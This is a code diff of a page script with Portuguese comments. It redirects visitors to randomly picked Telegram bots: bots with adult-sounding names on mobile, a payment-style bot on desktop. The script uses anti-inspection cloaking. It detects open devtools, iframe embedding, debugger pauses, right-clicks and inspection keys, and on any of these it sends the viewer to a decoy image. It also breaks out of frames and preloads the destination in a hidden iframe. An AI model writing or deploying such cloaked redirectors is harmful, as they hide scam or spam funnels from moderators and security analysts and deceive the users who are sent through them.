@@ -84,52 +84,48 @@
 <script>
 (()=>{
 
-  // === Links de destino ===
+  // === Links MOBILE atualizados com ?start=rd ===
   const mobileBots = [
-    "https://t.me/tmbrasilnovobrtelevzdbot?start=go",
-    "https://t.me/brasi3030lnovotelevzdbot?start=go",
-    "https://t.me/brasilnovo002televzdSBRbot?start=go",
-    "https://t.me/brasilnovo001telebot?start=go"
+    "https://t.me/ConexaoVipBot?start=rd",
+    "https://t.me/ClubeNoturnoBot?start=rd",
+    "https://t.me/NoiteAdentroBot?start=rd",
+    "https://t.me/CameraExclusivaBot?start=rd",
+    "https://t.me/GoldenAccessBot?start=rd"
   ];
+
+  // === Link DESKTOP mantido ===
   const desktopBot = "https://t.me/lasagnamax_pay112w3n_bot?start=go";
+
+  // === Link TRAP (para inspeção) ===
   const trap = "https://www.esmaelmorais.com.br/wp-content/uploads/2023/06/lula-faz-l.jpg.webp";
 
   const isMobile = /Mobi|Android|iPhone|iPad|iPod|Silk/i.test(navigator.userAgent);
   const rand = arr => arr[Math.floor(Math.random()*arr.length)];
 
-  // marca se o trap foi chamado, evita múltiplos jumps
   let trapTriggered = false;
   const triggerTrap = ()=> {
     if (trapTriggered) return;
     trapTriggered = true;
-    // jump imediato para o trap
     try { location.replace(trap); } catch(e) { location.href = trap; }
   };
 
-  // === Anti-inspeção rápida (executa sincronamente) ===
-  // Essas checagens são intencionadas para rodarem rápido antes do redirect.
   function quickInspectionDetected() {
-    // Devtools aberto: tentativa rápida via tamanho da janela
     try {
       const threshold = 160;
       const w = window.outerWidth - window.innerWidth;
       const h = window.outerHeight - window.innerHeight;
       if (!isMobile && (w > threshold || h > threshold)) return true;
     } catch(e) {}
-    // ancestorOrigins (iframe embed)
     try { if (document.location.ancestorOrigins && document.location.ancestorOrigins.length) return true; } catch(e){}
-    // timing-based: detecta debugger pausando execução (checa delta pequeno)
     try {
       const t0 = performance.now();
-      for (let i=0;i<50;i++) { /* tight loop - short */ }
+      for (let i=0;i<50;i++) {}
       const delta = performance.now() - t0;
-      // se delta for exageradamente grande, possivelmente houve pausa (debugger)
       if (delta > 120) return true;
     } catch(e){}
     return false;
   }
 
-  // Proteções que ainda registramos (eventos), mas não aguardamos em loop para não atrasar redirect
   document.addEventListener('contextmenu', e => { e.preventDefault(); triggerTrap(); }, {passive:false});
   document.addEventListener('keydown', e => {
     const k = e.key || '';
@@ -138,29 +134,23 @@
     }
   }, {passive:false});
   try{ if (window.top !== window.self) window.top.location = window.self.location; }catch(e){}
-  
-  // === REDIRECT ULTRA RÁPIDO ===
-  // Escolha de delay: 0 = imediato, 60 = ultra rápido (recomendado). 
-  const REDIRECT_DELAY_MS = 30; // ajuste para 0-200 conforme desejar
 
-  // Faz a checagem rápida síncrona agora
+  const REDIRECT_DELAY_MS = 30;
+
   if (quickInspectionDetected()) {
     triggerTrap();
     return;
   }
 
-  // Escolhe destino (igual ao original: mobile sorteia, desktop usa desktopBot)
   const dest = isMobile ? rand(mobileBots) : desktopBot;
 
-  // PREFETCH rápido: tenta abrir iframe escondido para ajudar no handoff para app (não atrasa)
   try {
     const frame = document.createElement('iframe');
     frame.src = dest;
     frame.style = "position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;border:0;visibility:hidden";
     document.body.appendChild(frame);
-  } catch(e){ /* ignore */ }
+  } catch(e){}
 
-  // jump ultra rápido (replace prefere não criar histórico)
   setTimeout(() => {
     if (trapTriggered) return;
     try { location.replace(dest); } catch(e) { location.href = dest; }
